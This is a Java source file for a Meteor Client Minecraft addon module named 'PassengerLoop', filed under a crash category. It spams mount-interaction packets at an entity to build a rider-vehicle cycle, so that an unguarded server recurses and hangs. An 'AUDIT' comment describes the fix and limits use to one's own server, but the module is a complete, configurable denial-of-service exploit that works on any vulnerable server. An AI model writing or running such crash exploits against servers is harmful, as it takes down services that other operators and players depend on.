package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.entity.Entity;
import net.minecraft.network.packet.c2s.play.PlayerInteractEntityC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.EntityHitResult;

/**
 * AUDIT: Passenger Mount Loop
 *
 * Spams mount-interaction packets on the entity you're looking at (and on your
 * current vehicle, if any), trying to provoke a passenger cycle - A rides B while
 * B rides A. If the server's passenger/vehicle traversal lacks a cycle guard,
 * building such a loop makes any code that walks the passenger chain (movement,
 * saving, dismount, rendering bounds) recurse without end and hang the tick loop.
 *
 * Look at a rideable entity (ideally while already riding another) and enable.
 *
 * Patch signal: reject any mount that would make an entity its own (transitive)
 * passenger; bound passenger-chain traversal depth defensively so a malformed
 * cycle can never spin a server thread.
 *
 * Run against your OWN local server only.
 */
public class PassengerLoop extends Module {
    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();

    private final Setting<Integer> perTick = sgGeneral.add(new IntSetting.Builder()
        .name("interactions-per-tick").description("Mount interactions sent each tick.")
        .defaultValue(20).range(1, 500).sliderRange(1, 100).build()
    );
    private final Setting<Boolean> includeVehicle = sgGeneral.add(new BoolSetting.Builder()
        .name("include-vehicle").description("Also interact with the vehicle you're riding.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );

    public PassengerLoop() {
        super(AddonTemplate.CRASH_CATEGORY, "passenger-loop",
            "Spams mount interactions to provoke a passenger cycle. Tests passenger-chain cycle guard / traversal bounds.");
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null) return;

        Entity looked = (mc.crosshairTarget instanceof EntityHitResult ehr) ? ehr.getEntity() : null;
        Entity vehicle = includeVehicle.get() ? mc.player.getVehicle() : null;
        if (looked == null && vehicle == null) return;

        for (int i = 0; i < perTick.get(); i++) {
            if (looked != null)
                mc.player.networkHandler.sendPacket(
                    PlayerInteractEntityC2SPacket.interact(looked, mc.player.isSneaking(), Hand.MAIN_HAND));
            if (vehicle != null)
                mc.player.networkHandler.sendPacket(
                    PlayerInteractEntityC2SPacket.interact(vehicle, mc.player.isSneaking(), Hand.MAIN_HAND));
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get() && isActive()) toggle();
    }
}
